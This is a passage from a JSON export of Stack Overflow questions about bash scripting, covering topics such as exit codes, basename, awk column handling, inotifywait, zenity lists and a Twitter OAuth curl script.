languages?","body":"<p>What are the differences between shell languages like <a href=\"http://www.gnu.org/software/bash/bash.html\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">bash</a>, <a href=\"http://zsh.sourceforge.net/\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">zsh</a>, <a href=\"http://fishshell.com/screenshots.html\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">fish</a> and the scripting languages above that makes them more suitable for the shell?</p>\n\n<p>When using the command line the shell languages seem to be much easier. It feels for me much smoother to use bash for example than to use the shell profile in ipython, <a href=\"http://transneptune.net/2009/06/16/ipython-as-your-default-shell/\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">despite reports to the contrary</a>. I think most wil agree with me that a large portion of medium to large scale programming is easier in Python than in bash. I use Python as the language I am most familiar with, the same goes for Perl and Ruby.</p>\n\n<p>I have tried to articulate the reason but am unable to, aside from assuming that the treatment of strings differently in both has something to do with it.</p>\n\n<p>The reason of this question is that I am hoping to develop a language usable in both. If you know of such a language, please post it as well.</p>\n\n<p>As S.Lott explains, the question needs some clarification. I am asking about the features of the shell <em>language</em> versus that of scripting languages. So the comparison is not about the characteristics of various interactive (<a href=\"http://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\" rel=\"nofollow\">REPL</a>) environments such as history and command line substitution. An alternative expression for the question would be:</p>\n\n<p>Can a programming language that is suitable for design of complex systems be at the same time able to express useful one-liners that can access the file system or control jobs? Can a programming language usefully scale up as well as scale down?</p>\n"},{"tags":["bash","curl","zenity"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12878203,"title":"zenity radiolist multi column population from curl","body":"<p>I have 3 columns of dynamic data to display in zenity - true/false, text1, text2</p>\n\n<p>please help me before I pull my hair out. Any method I have tried is not successful. I have tried arrays, strings etc but can't get it working. The following is the closest I've gotten, but the radiolist field is always false regardless of input:</p>\n\n<pre><code>    for i in $(curl -s \"some http link . . .\");\n    do;\n    dlist+=(\"$i\");\n    done\n\n    ans=$(zenity --list --width 800 --height 500 --title \"title:\" --radiolist --separator=\"|\" --column \"Select\" --column \"ID\" --column \"Description\" ${dlist[@]})\n</code></pre>\n"},{"tags":["python","ruby","perl","bash","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12878594,"title":"Scripting language to find the .a file name from the concatenated nm output for a list of .a files","body":"<p>I have a file with the nm output for all the .a files in an application. Now, how do I find out the .a which contains a specified function. </p>\n\n<p>I am good with Bash scripting and am fairly competent in Perl and can do some Python and Ruby.</p>\n\n<p>Any suggestions on the scripting language I can use for doing this?</p>\n\n<p>Question update:\nI have a file which I created with the following command:</p>\n\n<pre><code>$ find . -name '*'.a &gt; afile_list.log\n$ while read line; do echo \"$line\"; nm $line; done &lt; ./afile_list.log &gt; a_list.log\n</code></pre>\n\n<p>Now I have a function fun1() in the codebase. How do I find out which of the .a's has this function in it?</p>\n"},{"tags":["linux","bash","shell","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":322,"score":3,"question_id":7383144,"title":"What does \"$?\" give us exactly in a shell script?","body":"<p>I saw the code written somewhere online, and I wanted to know what exactly does \"$?\" do/give us.\nGoogling did not help.</p>\n\n<p>Here's the code I saw it in:</p>\n\n<pre><code>#!/bin/sh\n\nping -c 2 localhost\nif [ $? != 0 ] ; then\n    echo \"Couldn't ping localhost, weird\"\n    fi\n\nping -c 2 veryweirdhostname.noend \nif [ $? != 0 ] ; then\n    echo \"Surprise, Couldn't ping a very weird hostname..\"\n    fi\n\necho \"The pid of this process is $$\"\n</code></pre>\n\n<p>Taken from: <a href=\"http://efod.se/writings/linuxbook/html/shell-scripts.html\" rel=\"nofollow\">http://efod.se/writings/linuxbook/html/shell-scripts.html</a></p>\n"},{"tags":["bash","twitter","script","twitter-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12878772,"title":"Bash script to fetch protected twitter feed isn't working","body":"<p>I'm trying to get a bash script to fetch a protected twitter feed but it's not working.  I tried adding some basic functions to put together the appropriate information and build the oauth header but the script hangs (no errors).  My knowledge of functions is woefully slim so I think I'm missing something painfully obvious.  Can someone help?  Here's my sample code: </p>\n\n<pre><code>#!/usr/bin/env bash\n\nstep1() { k1=\"fooConsumerKey\" ; k2=\"fooConsumerSecret\" ; k3=\"FooAccessToken\" ; k4=\"FooAccessTokentSecret\" ; once=$RANDOM ; ts=$(date +%s) ; hmac=\"$k2&amp;$k4\" ; id=\"FooTwitterUserID\" ; }\n\nstep2() { b=\"GET&amp;https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&amp;follow%3D${id}%26oauth_consumer_key%3D${k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version%3D1.0\";}\n\nstep3() { s=$(echo -n $b | openssl dgst -sha1 -hmac $hmac -binary | openssl base64); signature=`for((i=0;i&lt;${#s};i++)); do case ${s:i:1} in +) e %2B;; /) e %2F;; =) e %3D;; *) e ${s:i:1};; esac ; done` ; } ; e() { echo -n $1; }\n\nstep4() { oauth_header=\"Authorization: OAuth oauth_consumer_key=\\\"$k1\\\", oauth_nonce=\\\"$once\\\", oauth_signature=\\\"$signature\\\", oauth_signature_method=\\\"HMAC-SHA1\\\", oauth_timestamp=\\\"$ts\\\", oauth_token=\\\"$k3\\\", oauth_version=\\\"1.0\\\"\" ; }\n\nstep1 ; step2 ; step3 ; step4 ; curl -o- --get 'https://stream.twitter.com/1/statuses/filter.json' --header \"$oauth_header\" --data \"follow=$id\"\n</code></pre>\n\n<p>The \"foo\" values are for display purposes only.  I've added the actual twitter API values in my real script. </p>\n\n<p>What am I missing here? </p>\n"},{"tags":["bash","dropbox","inotify"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12878546,"title":"inotifywait script watching a dropbox folder .... cp: cannot stat","body":"<p>my first question + here we go....</p>\n\n<p>this is a simple script, i had it working before, but now its dead.</p>\n\n<p>when a file comes into a dropbox folder, it appears on the server.\nthis simple script has inotifywait watching for appends\nand doing things i need done with the incoming files, in this case, a simple move\nto another folder.</p>\n\n<pre><code>    inotifywait -r -m -e attrib /path/to/watched/directory/\n\n    while read dir ev file;\n\n        do \n\n        cp $file ../123\n\n        done\n</code></pre>\n\n<p>I get this error </p>\n\n<pre><code>    cp: cannot stat `121013_0005.jpg': No such file or directory\n</code></pre>\n\n<p>I'm missing something simple, pls school me.</p>\n"},{"tags":["bash","mapping"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12877311,"title":"browsing through many paths for many files","body":"<p>I am currently working on a small bash script that reads source C files and then finds corresponding include files.</p>\n\n<p>Now I have to choose between two models of finding a mapping M: filename -> {include file paths }. What I have are two arrays - one with found include filenames and another containing possible paths. The options are :</p>\n\n<p>a) look for each file in one path, then proceed to another path;</p>\n\n<p>b) look through a list of paths to find one file, then proceed to another file.   </p>\n\n<p>My question is - what will be faster? There is equal number of iterations in each of the choices, but maybe some of the commands are more time-consuming? I personally prefer option a).</p>\n\n<p>Thanks for any help and sorry if this was a stupid question. </p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12875867,"title":"BASH - Stop execution of sourced scripts","body":"<p>I have a script that runs other scripts with source. What i want to do is to find those scripts being run, and if any of them is running, then stop executing it.\nSomething like this:</p>\n\n<pre><code> #!/bin/bash\n\n source /path/script1.sh\n source /path/sript2.sh\n source /path/sript3.sh\n\n if [ a_script_is_running ]\n then\n      stop_execution scriptn.sh\n fi\n</code></pre>\n\n<p>If one of those scripts was running an infinite loop, is there a way to stop this loop and to continue with the execution of the main script?</p>\n"},{"tags":["linux","bash","shell","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12876064,"title":"Linux - How to search for words in files and print how many times they occur?","body":"<p>I need to search through a directory, ARCHIVE, which contains many sub directories, each which contain files. Each file has an email address in it. I want to list all of the email address', with the @blah.com truncated, then list the occurrences for each name.</p>\n\n<p>I figured out how to find the emails and truncate the @ part, but I can't figure out how to count how many times each individual name occurs.</p>\n\n<pre><code>grep -R '^To: ' $ARCHIVE | cut -d@ -f1 | awk  '{print $2}' | sort | uniq\n</code></pre>\n\n<p>Also for some reason I can't get this to work in a script; whenever I call it it does nothing, but if I put it in the command line it works.</p>\n"},{"tags":["python","bash","pexpect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12738929,"title":"pexpect need to use pipe without starting the bash shell since the bash shell does not understand the command","body":"<p>I want to do something likethis using pexpect</p>\n\n<pre><code>echild = pexpect.spawn('/bin/bash -c \"sysinfo -v | grep \"SCM\"')\nfout = file('/home/kiva/release_file.txt' , 'w+')\nchild.logfile = fout\n</code></pre>\n\n<p>The problem is that I want the out of that command into a textfile but I have to start a shell since we cannot use pipe in spawn(). The bash shell does not understand sysinfo -v and complains about it.</p>\n\n<p>Do you guys have any idea or know of a way in which I can get the desired output into the file without opening the bash terminal? I can solve the issue by just using the spawn() method without grepping it but I want the exact match and hence grep is necessary.</p>\n\n<p>Thank you</p>\n"},{"tags":["bash","autocomplete"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12874920,"title":"'have' keyword for bash completion","body":"<p>Is <code>have</code> a keyword in bash? Or do bash completion scripts use a language that is not bash?</p>\n\n<pre><code>have gcc &amp;&amp;\n_gcc()\n{\n</code></pre>\n\n<p>It is common. See: <code>grep \"have .* &amp;&amp;\" /etc/bash_completion.d/*</code></p>\n\n<p>I could not find any information on the bash completion tutorials I've seen and I could not find any information in <code>man bash</code>. It's also difficult to google \"have\". Where do I find documentation on this?</p>\n\n<p>I'm guessing it has to do with making sure that there <code>gcc</code> exists in the <code>PATH</code>?</p>\n\n<p>edit: yes. <code>/etc/bash_completition</code> contains:</p>\n\n<pre><code>have()\n{\n    unset -v have\n    # Completions for system administrator commands are installed as well in\n    # case completion is attempted via `sudo command ...'.\n    PATH=$PATH:/sbin:/usr/sbin:/usr/local/sbin type $1 &amp;&gt;/dev/null &amp;&amp;\n    have=\"yes\"\n}\n</code></pre>\n"},{"tags":["osx","bash","unzip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12874956,"title":"How to unzip to the same directory in bash","body":"<p>I have hundreds of directories, each containing several zip files. I would like to iterate over each directory and unzip all zip files, placing the contents of the zip files into the same directory as the zip files themselves (without creating new sub-directories). Here's the bash script I have:</p>\n\n<pre><code>#!/bin/bash\nsrc=\"/path/to/directories\"\nfor dir in `ls \"$src/\"`\ndo\nunzip \"$src/$dir/*\"\ndone\n</code></pre>\n\n<p>This script does the unzipping, but it creates thousands of sub-directories and dumps them on my desktop! How can I get the desired behavior? I'm on Mac OSX if that makes a difference.</p>\n"},{"tags":["bash","awk","unique"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":5492,"score":2,"question_id":2781491,"title":"Counting unique values in a column with a shell script","body":"<p>I have a tab delimited file with 5 columns and need to retrieve a count of just the number of unique lines from column 2. I would normally do this with Perl/Python but I am forced to use the shell for this one.</p>\n\n<p>I have successfully in the past used *nix uniq function piped to wc but it looks like I am going to have to use awk in here.</p>\n\n<p>Any advice would be greatly appreciated. (I have asked a similar question previously about column checks using awk but this is a little different and I wanted to separate it so if someone in the future has this question this will be here)</p>\n\n<p>Many many thanks!<br>\nLilly </p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12873682,"title":"Short way to escape HTML in Bash?","body":"<p>The box has no Ruby/Python/Perl etc.</p>\n\n<p>Only bash/sed/awk.</p>\n\n<p>A way is to replace chars by map, but it becomes tedious.</p>\n\n<p>Perhaps some built-in functionality i'm not aware of?</p>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12873165,"title":"How to ensure I have exactly 2 spaces before string and zero spaces after","body":"<p>I get a string that can have from zero to multiple leading and trailing spaces.</p>\n\n<p>I'm trying to get rid of them without lot of hackery but my code looks huge.</p>\n\n<p>How to do this in a clean way?</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12868331,"title":"Is there a better way to swap the first half and the last half of a file's name in BASH?","body":"<p>So, I wrote some a BASH shell script for renaming image files downloaded from deviant art so the artist name comes first, then the name of the piece of art. (for those not familiar with dA, the system names downloadable image files as imageTitle_by_ArtistsName.extention, which makes it hard to organize images quickly). It works... but it seems so clunky. Is there a more elegant way to handle this?</p>\n\n<p>The code:</p>\n\n<pre><code>#!/bin/bash\n#############################\n# A short script for renaming\n#Deviant Art files\n#############################\n\necho \"Please enter your image directory: \"\nread NewDir\n\necho \"Please enter your destination directory: \"\nread DestinationDir\n\nmkdir $DestinationDir\ncd $NewDir\n\n\nls&gt;&gt;NamePile\n\nListOfFiles=`cat NamePile`\n\n\nfor x in $ListOfFiles\ndo\n\n\n#Pull in the file Names\nFileNameVar=$x\n\n\n#Get the file types\nFileType='.'${FileNameVar#*.}\n\n#Chop the Artists name\nArtistsName=${FileNameVar%%.*}\nArtistsName=${ArtistsName##*_by_}\n\n#Chop the pieces name\nImageName=${FileNameVar%%.*}\nImageName=${ImageName%%_by_*}\n\n#Reassemble the New Name\nNewFileName=$ArtistsName\" \"$ImageName$FileType\n\ncp $x ../$DestinationDir/\"$NewFileName\"\n\n\ndone\n\nrm NamePile\n#######################################\n</code></pre>\n"},{"tags":["regex","string","bash","shell"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2113,"score":3,"question_id":638991,"title":"What is the best way to do string manipulation in a shell script?","body":"<p>I have a path as a string in a shell-script, could be absolute or relative:</p>\n\n<p>/usr/userName/config.cfg</p>\n\n<p>or</p>\n\n<p>../config.cfg</p>\n\n<p>I want to extract the file name (part after the last /, so in this case: \"config.cfg\")</p>\n\n<p>I figure the best way to do this is with some simple regex?\nIs this correct?  Should or should I use sed or awk instead?  </p>\n\n<p>Shell-scripting's string manipulation features seem pretty primative by themselves, and appear very esoteric.  </p>\n\n<p>Any example solutions are also appreciated.</p>\n"},{"tags":["bash","rename","prefix"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":2151,"score":-1,"question_id":1322105,"title":"bash: how to change the basename only of a list of files","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1322643/makefile-how-to-add-a-prefix-to-the-basename\">makefile: how to add a prefix to the basename?</a>  </p>\n</blockquote>\n\n\n\n<p>I have a lit of files (which I get from <code>find bla -name \"*.so\"</code>) such as:</p>\n\n<p><code>/bla/a1.so\n/bla/a2.so\n/bla/blo/a3.so\n/bla/blo/a4.so\n/bla/blo/bli/a5.so</code></p>\n\n<p>and I want to rename them such as it becomes:</p>\n\n<p><code>/bla/liba1.so\n/bla/liba2.so\n/bla/blo/liba3.so\n/bla/blo/liba4.so\n/bla/blo/bli/liba5.so</code></p>\n\n<p>... i.e. add the prefix 'lib' to the basename</p>\n\n<p>any idea on how to do that in bash ?</p>\n"},{"tags":["bash","unix","pwd"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1473,"score":4,"question_id":1744595,"title":"Extract the last directory of a pwd output","body":"<p>How do I extract the last directory of a pwd output? I don't want to use any knowledge of how many levels there are in the directory structure. If I wanted to use that, I could do something like:</p>\n\n<pre><code>&gt; pwd\n/home/kiki/dev/my_project\n&gt; pwd | cut -d'/' -f5\nmy_project\n</code></pre>\n\n<p>But I want to use a command that works regardless of where I am in the directory structure. I assume there is a simple command to do this using awk or sed.</p>\n"},{"tags":["bash","for-loop","awk","compare"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":222,"score":2,"question_id":3597316,"title":"I want a to compare a variable with files in a directory and output the equals","body":"<p>I am making a bash script where I want to find files that are equal to a variable. The equals will then be used.</p>\n\n<p>I want to use \"mogrify\" to shrink a couple of image files that have the same name as the ones i gather from a list (similar to \"dpkg -l\"). It is not \"dpkg -l\" I am using but it is similar. My problem is that it prints all the files not just the equals. I am pretty sure this could be done with awk instead of a for-loop but I do not know how.</p>\n\n<pre><code>prog=\"`dpkg -l | awk '{print $1}'`\"\n\nfor file in $dirone* $dirtwo*\ndo\n     if [ \"basename ${file}\" = \"${prog}\" ]; then\n         echo ${file} are equal\n     else\n         echo ${file} are not equal\n     fi\ndone\n</code></pre>\n\n<p>Could you please help me get this working?</p>\n"},{"tags":["bash","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":447,"score":2,"question_id":9424888,"title":"basename or endswith in awk?","body":"<p>I'm using <code>awk</code> to get the <code>pid</code> of a specific process by name. </p>\n\n<pre><code>#!/bin/sh\n\nfor pid in $(ps | awk '$4 == \"foo\" { print $1 }')\ndo\n    i=1\n    echo \"killing foo at pid $pid\"\n    kill $pid &amp;&amp; echo 'ok' || echo 'failed'\ndone\n</code></pre>\n\n<p>where <code>ps</code> output on OSX is something like:</p>\n\n<pre><code>$ ps\n  PID TTY           TIME CMD\n 1858 ttys000    0:00.15 -bash\n 4148 ttys000    0:01.37 /a/b/c/foo\n</code></pre>\n\n<p>but my shell script only works if the process in the <code>CMD</code> column is exactly <code>foo</code> (no absolute paths).</p>\n\n<p>I'm thinking I can use <code>basename</code>, but how do I call it from <code>awk</code>? \n<br> <strong>OR</strong> <br>\nIs there something like <code>$4.endswith('foo')</code> in <code>awk</code>?</p>\n"},{"tags":["file","bash","variables","debian"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":153,"score":0,"question_id":9556939,"title":"How do I put basename into a variable?","body":"<pre><code>#!/bin/bash\nfile=debian.deb\ntest=basename $file .deb\nDP=\"blah/blah/$test/$test.php\"\nread -p \"[$DP]: \" DPREPLY\nDPREPLY=${DPREPLY:-$DP}\necho \"Blah is set to $DPREPLY\"\necho $DPREPLY&gt;&gt;testfile\n</code></pre>\n\n<p>So what I'm trying to do is set the variable test from the variable file and use it in the file testfile.</p>\n"},{"tags":["osx","bash","quotes"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":86,"score":2,"question_id":11705875,"title":"Basename puts single quotes around variable","body":"<p>I am writing a simple shell script to make automated backups, and I am trying to use basename to create a list of directories and them parse this list to get the first and the last directory from the list.</p>\n\n<p>The problem is: when I use basename in the terminal, all goes fine and it gives me the list exactly as I want it. For example:</p>\n\n<pre><code>basename -a /var/*/ \n</code></pre>\n\n<p>gives me a list of all the directories inside /var without the / in the end of the name, one per line.\nBUT, when I use it inside a script and pass a variable to basename, it puts single quotes around the variable:</p>\n\n<pre><code>while read line; do\ndir_name=$(echo $line)\nbasename -a $dir_name/*/ &gt; dir_list.tmp\ndone &lt; file_with_list.txt\n</code></pre>\n\n<p>When running with +x:</p>\n\n<pre><code>+ basename -a '/Volumes/OUTROS/backup/test/*/'\n</code></pre>\n\n<p>and, therefore, the result is not what I need.</p>\n\n<p>Now, I know there must be a thousand ways to go around the basename problem, but then I'd learn nothing, right? ;)</p>\n\n<p>How to get rid of the single quotes?\nAnd if my directory name has spaces in it?</p>\n"},{"tags":["bash","printf"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12845638,"title":"How do i change the decimal separator in the printf command in bash?","body":"<p>I use the Italian localization of Cygwin, and therefore my printf command uses commas to separate floats, and won't understand dot-separated floats</p>\n\n<pre><code>$ printf \"%f\" 3.1415\n-bash: printf: 3.1415: invalid number\n0,000000\n\n$ printf \"%f\" 3,1415\n3,141500\n</code></pre>\n\n<p>This gives rise to several problems because basically everything else uses a dot to separate decimal digits.</p>\n\n<p>How can I change the decimal separator from comma to dot?</p>\n"},{"tags":["bash","scripting","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":127,"score":0,"question_id":3955509,"title":"Ensuring shell script is being executed by BASH (not csh, ksh, sh etc.)","body":"<p>How would you exit-gracefully-upon-entry when invoking a .sh script from anything other than bash?</p>\n"},{"tags":["linux","bash","text","grep","compare"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":12869354,"title":"How to compare two text files for the same exact text using BASH?","body":"<p>Let's say I have two text files that I need to extract data out of. The text of the two files is as follows:</p>\n\n<p><strong>File 1:</strong></p>\n\n<pre><code>1name - randomemail@email.com\n2Name - superrandomemail@email.com\n3Name - 123random@email.com\n4Name - random123@email.com\n</code></pre>\n\n<p><strong>File 2:</strong> </p>\n\n<pre><code>email.com\nemail.com\nemail.com\nanotherwebsite.com\n</code></pre>\n\n<p>File 2 is File 1's list of domain names, extracted from the email addresses.\nThese are not the same domain names by any means, and are quite random.</p>\n\n<p>How can I get the results of the domain names that match File 2 from File 1?</p>\n\n<p>Thank you in advance!</p>\n"},{"tags":["arrays","bash","export","script"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":819,"score":2,"question_id":5564418,"title":"Exporting an array in bash script","body":"<p>I can not export an array from a bash script to another bash script like this:</p>\n\n<pre><code>export myArray[0]=\"Hello\"\nexport myArray[1]=\"World\"\n</code></pre>\n\n<p>When I write like this there are no problem:</p>\n\n<pre><code>export myArray=(\"Hello\" \"World\")\n</code></pre>\n\n<p>For several reasons I need to initialize my array into multiple lines. Do you have any solution?</p>\n"},{"tags":["bash","synchronization","directory","compression","gzip"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":10527240,"title":"Bash: Maintaining a set of files and their gzipped equivalent","body":"<p>I have a directory tree in which there are some files and some subdirectories.</p>\n\n<pre><code>/\n/file1.txt\n/file2.png\n/dir1\n    /subfile1.gif\n</code></pre>\n\n<p>The objective is to have a script that generates a gzipped version of each file and saves it next to each file, with an added <code>.gz</code> suffix:</p>\n\n<pre><code>/\n/file1.txt\n/file1.txt.gz\n/file2.png\n/file2.png.gz\n/dir1\n    /subfile1.gif\n    /subfile1.gif.gz\n</code></pre>\n\n<p>This would handle the creation of new <code>.gz</code> files.</p>\n\n<p>Another part is deletion: Whenever a non-gzipped file is created, the script would need to delete the orphaned <code>.gz</code> version when it runs.</p>\n\n<p>The last and trickiest part is modification: Whenever some (non-gzipped) files are changed, re-running the script would update the <code>.gz</code> version of only those changed files, based on file timestamp (<code>mtime</code>) comparison between a file and its gzipped version.</p>\n\n<p>Is it possible to implement such a script in bash?</p>\n\n<p><strong>Edit</strong>: The goal of this is to have prepared compressed copies of each file for nginx to serve using the gzip_static module. It is not meant to be a background service which automatically compresses things as soon as anything changes, because nginx's gzip_static module is smart enough to serve content from the uncompressed version if no compressed version exists, or if the uncompressed version's timestamp is more recent than the gzipped version's timestamp. As such, this is a script that would run occasionally, whenever the server is not busy.</p>\n"},{"tags":["bash","shell","alias"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12870950,"title":"Alias for linux redirection operator","body":"<p>I'm trying to create an alias for redirection operators i.e. >, &lt;, >> and also for background process symbol &amp;, using</p>\n\n<pre><code>alias g=\"&gt;\"\n</code></pre>\n\n<p>But when i use <code>cat filename.txt g test.txt</code>, it just prints the filename to stdout and at the end shows </p>\n\n<pre><code>cat: r: No such file or directory\ncat: test1.c: No such file or directory\n</code></pre>\n\n<p>I'm using bash shell.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12870375,"title":"How can I force a syntax error in an arithmetic expression to abort my Bash script?","body":"<p>I recently had a problem in one of my Bash scripts that was caused by unexpected output from one of the SSH commands it ran (due to an OS version upgrade). The problem actually resulted in a Bash syntax error, because I was expecting this output to contain only a numeric status code (from a remote script), which I then used in an arithmetic expression.</p>\n\n<p>What surprised me, though, was that my Bash script continued executing after reporting the syntax error. This, despite the fact that I have the following line near the beginning of the file:</p>\n\n<pre><code># Terminate script if any command fails\nset -o errexit\n</code></pre>\n\n<p>Although a syntax error is obviously not the same as a failed command, it seems to me that that the former represents an even more serious error condition.</p>\n\n<p>I know that you can use the -n parameter to check the syntax of a Bash script without actually executing any commands, but that would not have caught this problem anyway.</p>\n\n<p>Here's an example which causes the error but does not exit:</p>\n\n<pre><code>#!/bin/bash\nset -o errexit\nx=\")\"\necho $(( x + 1 ))\necho still running\n</code></pre>\n\n<p>Is there any way to force a Bash script to terminate immediately after a syntax error in an arithmetic expression is detected during its normal operation?</p>\n"},{"tags":["linux","bash","shell","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12855603,"title":"Redirect tr output to sed","body":"<p>I need to replace a string in a file with another string, but before the replacement I need to lowercase the new string before passing it to <code>sed</code>.</p>\n\n<p><code>echo 'NEWSTRING' | tr '[:upper:]' '[:lower:]' | sed 's/foo/(my tr output in lowercase)/g' file.txt</code></p>\n\n<p>My question is, How we could pass the replacement string as a parameter ?</p>\n"},{"tags":["linux","bash","backup","webdav","rsync"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":47,"score":-1,"question_id":12870434,"title":"How to merge multiple WebDAV accounts for backup?","body":"<p>I use davfs, aufs, rsync:</p>\n\n<pre><code>sudo mount -t davfs -o uid=wd,gid=wd,dir_mode=777,rw https://wd.wd.wd/ /mnt/webdav1\nsudo mount -t davfs -o uid=wd,gid=wd,dir_mode=777,rw https://wd.wd.wd/ /mnt/webdav2\nsudo mount -t davfs -o uid=wd,gid=wd,dir_mode=777,rw https://wd.wd.wd/ /mnt/webdav3\nsudo mount -t aufs none /mnt/webdav/ -o br:/mnt/webdav1=rw:/mnt/webdav2=rw:/mnt/webdav3=rw,create=mfs,sum\nrsync -r /home/user/bp /mnt/webdav/backup\n</code></pre>\n\n<p>But I have many problems:</p>\n\n<ol>\n<li>aufs pumped into one stream on webdav server</li>\n<li>rsync does not work resume files (tried - ignore-existing but not working)</li>\n</ol>\n\n<p>Does anyone know how to fix these problems or advise other software? I thought of using ownCloud but I'm not sure whether it can unite WebDAV server into one for backup.</p>\n"},{"tags":["bash","printing","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12791269,"title":"AWK: print $i returns nothing","body":"<p><code>$file</code> is a csv (tab-delimited) with 59 cols and 64 rows. Column 1 is always a string and cols 2+ are always an integer (except once when the value is <code>NULL</code>).</p>\n\n<pre><code>cat ${file} | while read line \n    do awk -F'\\t' '{ for (i=2; i&lt;=NF; i++) print $1 \"\\t\" $i \".\" }';\n    done;\n</code></pre>\n\n<p>Outputs:</p>\n\n<pre><code>Excellent   .\nGood    .\n…\n</code></pre>\n\n<p>And yet switching <code>$i</code> to <code>$2</code> works:</p>\n\n<pre><code>Excellent   29.\nGood    7.\n…\n</code></pre>\n\n<p>Why??</p>\n\n<p><strong>EDIT</strong>:</p>\n\n<pre><code>#lines 1 &amp; 2 from data.csv (columns truncated for brevity):\nExcellent   29  54  47  46  38  22  50\nGood    7   14  27  24  26  36  20\n\n#reform.sh\nfile=$1;\nawk -F'\\t' '{ for (i=2; i&lt;=NF; i++) print $1 \"\\t\" $i; }' ${file};\n</code></pre>\n\n<p>Still behaves/returns like the previous.</p>\n\n<p><strong>RESOLUTION</strong>:</p>\n\n<p>The approved answer does provide the proper output from AWK. After restarting my Terminal application, the script performed as described. I was not able to determine the cause of the Terminal app issue.</p>\n"},{"tags":["bash","awk","terminal","multiple-columns"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":96,"score":2,"question_id":12458729,"title":"awk to output table-like or excel-like columns in linux terminal?","body":"<p>I do a long pipe, that ends with ...| awk '{print $5\"\\t\\t\" $3\"\\t\"$4}' in linux terminal. The columns are padded with tabs. The first colmn entries have different number of characters, so the second column results are not perfectly vertical. How to make the table look perfect?</p>\n\n<p><img src=\"http://i.stack.imgur.com/lStuP.png\" alt=\"enter image description here\"></p>\n"},{"tags":["linux","bash","unix"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12870206,"title":"Is 「Alt+F2 firefox」 equivalent to 「firefox &」 in terminal?","body":"<p>Linux has its <kbd>Alt</kbd><kbd>F2</kbd> run dialog. In it, you can type <code>firefox</code> without adding <code>&amp;</code>.</p>\n\n<p>Is this equivalent to just <code>firefox &amp;</code> in a terminal? </p>\n\n<p>In addition, I'd like to know how the panel is implemented. Does the backend simply add the ampersand, or is it using some “nohup”? How can I see the source code for this panel? </p>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":1,"up_vote_count":28,"down_vote_count":0,"view_count":1622,"score":28,"question_id":8579399,"title":"why is true == false in bash?","body":"<p>Why does bash have the 